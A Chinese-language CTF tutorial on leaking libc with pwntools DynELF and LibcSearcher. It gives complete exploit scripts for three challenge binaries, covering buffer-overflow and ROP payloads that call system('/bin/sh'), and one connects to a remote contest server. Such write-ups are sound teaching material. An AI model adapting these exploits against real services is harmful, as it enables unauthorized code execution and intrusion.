# 利用漏洞获取libc

## EynELF简介

DynELF通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算比对出目标符号在内存中的地址。
DynELF类的使用方法：

```python
    # Assume a process or remote connection
    p = process('./pwnme')

    # Declare a function that takes a single address, and leaks at least one byte at that address.
    def leak(address):
        data = p.read(address, 4)
        # data = p.recv(4)
        log.debug("%#x => %s" % (address, (data or '').encode('hex')))
        return data

    # For the sake of this example, let's say that we have any of these pointers.  One is a pointer into the target binary, the other two are pointers into libc
    main   = 0xfeedf4ce
    libc   = 0xdeadb000
    system = 0xdeadbeef

    # With our leaker, and a pointer into our target binary, we can resolve the address of anything.
    #
    # We do not actually need to have a copy of the target binary for this to work.
    d = DynELF(leak, main)
    assert d.lookup(None,     'libc') == libc
    assert d.lookup('system', 'libc') == system

    # However, if we do have a copy of the target binary, we can speed up some of the steps.
    d = DynELF(leak, main, elf=ELF('./pwnme'))
    assert d.lookup(None,     'libc') == libc
    assert d.lookup('system', 'libc') == system

    # Alternately, we can resolve symbols inside another library, given a pointer into it.
    d = DynELF(leak, libc + 0x1234)
    assert d.lookup('system')  == system
    # assert 断言，assert后的条件为真时执行，为假时抛出异常
```

使用DynELF时，我们需要使用一个leak函数作为必选参数，指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数，以初始化一个DynELF类的实例d。然后通过这个实例d的方法lookup来搜寻libc库函数。
其中，leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的int型参数addr对应的内存地址中的数据。且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。
它的基本使用框架如下,其中,address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码:

```python
    p = process('./xxx')
        def leak(address):
        #各种预处理
        payload = "xxxxxxxx" + address + "xxxxxxxx"
        p.send(payload)
        #各种处理
        data = p.recv(4)
        log.debug("%#x => %s" % (address, (data or '').encode('hex')))
        return data
    d = DynELF(leak, elf=ELF("./xxx"))      #初始化DynELF模块
    system_addr = d.lookup('system', 'libc')  #在libc文件中搜索system函数的地址
```

使用的基本条件：

- 目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；
- 目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。

## DynELF的使用————write函数

write函数原型是`write(fd, addr, len)`，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。

例`~/PlaidCTF 2013 ropasaurusrex/ropasaurusrex`,程序只有一个函数，有一个明显的溢出，但是got表中，没有system函数，也没有`int 80h/syscall`。这种情况就可以使用DynELF来leaklibc，进而获取system函数在内存中的地址。

```python
from pwn import *

p=process('./ropasaurusrex')

def leak(addr):
    payload='A'*0x8c+p32(0x0804830C) + p32(0x080483F4) + p32(1) +p32(addr) + p32(8)
    # 0x0804830C为write函数的地址，0x080483F4为write函数的返回地址(这里使用的是调存在溢出的函数的地址)，也可以是start段的地址0x08048340，或者main函数的地址0x0804841D
    p.send(payload)
    data = p.read(addr,4)
    log.debug("%#x => %s" % (addr,(data or '').encode('hex')))
    return data

d = DynELF(leak,elf=ELF('./ropasaurusrex'))

system_addr = d.lookup('system','libc')
log.info("system_addr = %#x",system_addr)
```

同样的还可以通过这个DynELF类的实例泄露read函数的真正内存地址，用于读取”/bin/sh”字符串到内存中，以便于执行system(“/bin/sh”)。最终脚本如下：
因为后面还要利用程序的溢出来获取shell，所以此时如果在leak函数中write函数的返回地址设为函数sub_80483F4的话会导致后续的堆栈不平衡，从而获取shell失败，即泄露过程中由于循环造成的溢出导致栈结构发生不可预料的变化，此时可以调用start函数来重新开始程序以恢复栈。

```python
    from pwn import *

    p=process('./ropasaurusrex')
    elf = ELF('./ropasaurusrex')

    write_plt = elf.symbols['write']

    def leak(addr):
        payload='A'*0x8c+p32(write_plt) + p32(start) + p32(1) +p32(addr) + p32(8)
        # payload='A'*0x8c+p32(write_plt) + p32(main) + p32(1) +p32(addr) + p32(8)
        p.send(payload)
        data = p.read(addr,4)
        log.debug("%#x => %s" % (addr,(data or '').encode('hex')))
        return data

    bss_addr = 0x08049628
    func = 0x080483F4
    start = 0x08048340
    main = 0x0804841D

    d = DynELF(leak,elf=ELF('./123'))
    # d = DynELF(leak,elf=elf)

    system_addr = d.lookup('system','libc')
    log.info("system_addr = %#x",system_addr)
    read_addr = d.lookup('read','libc')
    log.info("read_addr = %#x",read_addr)
    # read_plt = elf.symbols['read']

    payload1 = 'A'*0x8c + p32(read_addr) + p32(func) + p32(0) + p32(bss_addr) + p32(8)
    # payload1 = 'A'*0x8c + p32(read_addr) + p32(start) + p32(0) + p32(bss_addr) + p32(8)
    # payload1 = 'A'*0x8c + p32(read_addr) + p32(main) + p32(0) + p32(bss_addr) + p32(8)
    p.send(payload1)
    sleep(1)
    p.send("/bin/sh\x00")
    sleep(1)

    payload2 = 'A'*0x8c + p32(system_addr) + p32(func) + p32(bss_addr)
    p.send(payload2)

    p.interactive()

    # other way
    # payload = 'A'*0x8c + p32(read_addr) + p32(system_addr) + p32(0) + p32(bss_addr) + p32(8)
    # p.send(payload)
    # sleep(1)
    # p.send('/bin/sh\x00')
    # sleep(1
    # p.interactive()
```

## DynELF的使用————puts函数

puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。
利用puts函数输出的字符串最后一位为“n“这一特点，分两种情况：

- puts输出完后就没有其他输出

```python
    def leak(address):
    count = 0
    data = ''
    payload = xxx
    p.send(payload)
    print p.recvuntil('xxx\n') #一定要在puts前释放完输出,然后程序执行到retn，开始执行我们的payload
    up = ""

    # while循环过滤得到泄露的地址
    while True:
        #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了
        #以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””
        c = p.recv(numb=1, timeout=1)
        count += 1
        if up == '\n' and c == "":  #接收到的上一个字符为回车符，而当前接收不到新字符，则
            data = data[:-1]             #删除puts函数输出的末尾回车符
            data += "\x00"
            break
        else:
            data += c
            up = c
    data = data[:4]  #取指定字节数
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data
  ```

- puts函数输出完后还有其他输出

```python
    def leak(address):
    count = 0
    data = ""
    payload = xxx
    p.send(payload)
    print p.recvuntil("xxx\n") #一定要在puts前释放完输出
    up = ""
    while True:
        c = p.recv(1)
        count += 1
        if up == '\n' and c == "x":  #一定要找到泄漏信息的字符串特征,即puts函数输出完其他输出的第一串字符串的特征，这里用x表示
            data = data[:-1]
            data += "\x00"
            break
        else:
            data += c
            up = c
    data = data[:4]
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data
```

例`~/LCTF 2016-pwn100/pwn100`,程序的溢出点在sub_40063D中，但是程序是64位的，传入参数时比较麻烦。通过上面的模板泄露system函数：

```python
    from pwn import *

    p = process('./pwn100')
    elf = ELF('./pwn100')

    puts_plt = elf.symbols['puts']
    log.info("puts_plt = %#x",puts_plt)

    def leak(addr):
        count = 0
        up = ''
        data = ''
        payload = 'A'*72 + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(main)
        payload = payload.ljust(200,'\x00')
        p.send(payload)

        p.recvuntil("bye~\n")
        while True:
            c = p.recv(numb=1,timeout=0.1)
            count += 1
            if up == '\n' and c == '':
                data = data[:-1]
                data += "\x00"
                break
            else:
                data += c
                up = c
        data = data[:4]
        log.info("%#x => %s" % (addr, (data or '').encode('hex')))
        return data

    main = 0x04006B8
    pop_rdi = 0x0400763
    # pop rdi;ret

    d = DynELF(leak,elf=ELF('./pwn100'))

    system_addr = d.lookup('system','libc')
    log.info("system_addr = %#x",system_addr)
```

得到system函数之后就可以接着构造ROP链来拿到shell了。因为read函数(读取"/bin/sh")需要三个参数，但是找不到`pop rdx;ret`类似的指令给rdx赋值，所以这里需要利用万能的gadgets来获取"/bin/sh"和调用system函数。
完整脚本如下：

```python
    from pwn import *

    p = process('./pwn100')
    elf = ELF('./pwn100')

    puts_plt = elf.symbols['puts']
    log.info("puts_plt = %#x",puts_plt)
    read_plt = elf.got['read']
    log.info("read_plt = %#x",read_plt)

    def leak(addr):
        count = 0
        up = ''
        data = ''
        payload = 'A'*72 + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(main)
        payload = payload.ljust(200,'\x00')
        p.send(payload)

        p.recvuntil("bye~\n")
        while True:
            c = p.recv(numb=1,timeout=0.1)
            count += 1
            if up == '\n' and c == '':
                data = data[:-1]
                data += "\x00"
                break
            else:
                data += c
                up = c
        data = data[:4]
        log.info("%#x => %s" % (addr, (data or '').encode('hex')))
        return data

    start = 0x00400550
    main = 0x04006B8
    pop_rdi = 0x0400763
    # pop rdi;ret
    bss_addr = 0x0601060

    d = DynELF(leak,main,elf=ELF('./pwn100'))

    system_addr = d.lookup('system','libc')
    log.info("system_addr = %#x",system_addr)

    gadget1 = 0x0040075b
    # pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    gadget2 = 0x0400740
    # mov     rdx, r13
    # mov     rsi, r14
    # mov     edi, r15d
    # call    qword ptr [r12+rbx*8]
    # add     rbx, 1
    # cmp     rbx, rbp

    payload1 = 'B'*72
    payload1 += p64(gadget1)
    payload1 += p64(1) + p64(read_plt) + p64(8) + p64(bss_addr) + p64(0)
    payload1 += p64(gadget2)
    payload1 += '\x00'*56
    payload1 += p64(start)
    payload1 = payload1.ljust(200,'D')

    p.send(payload1)
    sleep(1)
    p.send("/bin/sh\x00")
    sleep(1)

    payload2 = 'C'*72
    payload2 += p64(pop_rdi) + p64(bss_addr) + p64(system_addr)
    payload2 = payload2.ljust(200,"D")
    p.send(payload2)
    p.interactive()
```

## 其他获取libc的方法

[网站](https://libc.blukat.me)可以通过泄露的地址来查询

### LibcSearcher

通过泄露出系统函数(read,puts等)来获取system以及其他函数、字符串的地址

```python
    libc = LibcSearcher('read',read_addr)
    libc_base = read_addr - libc.dump('read')
    system_addr = libc_base + libc.dump('system')
    binsh_addr = libc_base + libc.dump('bin_string_addr')
```

例，`~安恒杯2020新春祈福赛\babyrop`

```python
    from pwn import *
    from LibcSearcher import *

    # p = process('/home/nop/Desktop/babyrop')
    p = remote('183.129.189.60',10011)
    elf = ELF('/home/nop/Desktop/babyrop')

    put_plt = elf.symbols['puts']
    log.info("put_plt = %#x",put_plt)
    put_got = elf.got['puts']
    log.info("put_got = %#x",put_got)
    read_plt = elf.symbols['read']
    log.info("read_plt = %#x",read_plt)

    payload1 = 'A'*0x20 + p32(0x66666666)
    p.send(payload1)
    p.recv()

    payload2 = 'B'*0xC + '-1' + 'B'*6
    payload2 += p32(put_plt) + p32(0x08048400) + p32(put_got)
    p.send(payload2)

    p.recvuntil('name?\n')  # 连上服务器之后程序会输出：'What's you name?\n'，然后才是泄露的地址
    put_addr = u32(p.recv()[:4].ljust(4,'\x00'))
    log.info("put_addr = %#x",put_addr)

    libc = LibcSearcher('puts',put_addr)
    libc_base = put_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    log.info("system_addr = %#x",system_addr)

    p.send(payload1)
    p.recv()

    payload3 = 'B'*0xC + '-1' + 'B'*6
    payload3 += p32(read_plt) + p32(system_addr) + p32(0) + p32(0x0804A048) + p32(8) + p32(0x0804A048)
    p.send(payload3)
    sleep(1)
    p.send('/bin/sh\x00')
    sleep(1)
    p.interactive()
```
